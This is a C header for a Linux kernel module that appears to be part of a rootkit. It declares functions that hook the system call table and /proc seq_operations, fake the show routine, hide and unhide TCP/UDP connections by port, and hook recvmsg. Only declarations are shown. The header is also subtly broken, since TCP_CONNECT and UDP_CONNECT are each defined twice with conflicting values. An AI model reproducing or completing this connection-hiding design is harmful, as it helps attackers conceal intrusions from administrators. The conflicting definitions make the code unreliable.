#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/inet_diag.h> /* Needed for ntohs */
#include <net/tcp.h>         // struct tcp_seq_afinfo.
#include <net/udp.h>         // struct tcp_seq_afinfo.

#define TCP_CONNECT 1
#define UDP_CONNECT 2
#define TCP_CONNECT 3
#define UDP_CONNECT 4


#define PORT_STR_LEN 6

typedef int (*seq_show_fun)(struct seq_file *seq, void *v);

struct port_node
{
    unsigned int port;
    int type;
    struct list_head list;
};


int hide_connect_init(void **real_sys_call_table);
int hide_connect_exit(void **real_sys_call_table);
void set_seq_operations(const char* open_path,struct seq_operations * operations);
void hook_seq_operations(void *base, size_t offset, void *new_ptr, void **old_ptr);
int fake_seq_show(struct seq_file *seq, void *v);
void hide_connect(int type, int port);
void unhide_connect(int type, int port);
static ssize_t my_sys_recvmsg(const struct pt_regs *regs);
bool get_connect_param(const char* str,int *port,int *type);


